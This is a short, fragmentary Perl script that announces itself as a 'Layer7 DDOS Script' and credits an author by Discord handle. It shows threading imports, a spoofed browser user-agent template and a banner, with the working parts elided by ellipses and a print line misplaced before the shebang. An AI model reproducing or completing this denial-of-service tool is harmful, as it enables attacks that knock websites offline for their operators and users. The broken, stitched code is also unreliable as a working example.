print "CODED BY P3TKA7A";
#!/usr/bin/perl

#~> [-------------------------------] <~#
#~> [ Discord: P3TKA7A#7777         ] <~#
#~> [ Website: SOON                 ] <~#
#~> [-------------------------------] <~#
...
use threads ('yield', 
	...
	'stringify');
use threads::shared;
my $ua = "Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Firefox/%.1f.%.1f";
my $hilo;
...
if($#ARGV > 3) {
    ...
    print("
[+]---------------------------------------------------------------[+]
                   Layer7 DDOS Script - Maded By P3TKA7A                   
[+]---------------------------------------------------------------[+]
